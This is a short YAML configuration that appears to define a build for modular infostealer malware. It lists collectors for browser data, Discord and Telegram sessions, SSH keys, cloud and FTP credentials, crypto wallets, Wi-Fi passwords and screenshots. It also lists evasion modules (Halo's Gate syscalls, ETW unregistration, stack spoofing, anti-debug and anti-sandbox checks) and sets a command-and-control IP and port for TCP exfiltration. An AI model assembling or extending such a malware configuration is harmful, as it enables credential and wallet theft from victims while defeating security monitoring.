name: infostealer_deathsleep
description: "Infostealer with DeathSleep thread termination, Halo's Gate fallback syscalls, ETW provider unregistration"

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/wifi_passwords
  - collectors/browser_chromium
  - collectors/discord_tokens
  - collectors/telegram_session
  - collectors/ftp_credentials
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/crypto_wallets
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/sequential
api_resolve: api_resolve/api_hash_crc32
resources: true

evasion:
  - evasion/halos_gate
  - evasion/sleep_deathsleep
  - evasion/etw_provider_unreg
  - evasion/stack_spoof_gadget
  - evasion/anti_debug_hwbp
  - evasion/anti_sandbox_wmi

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
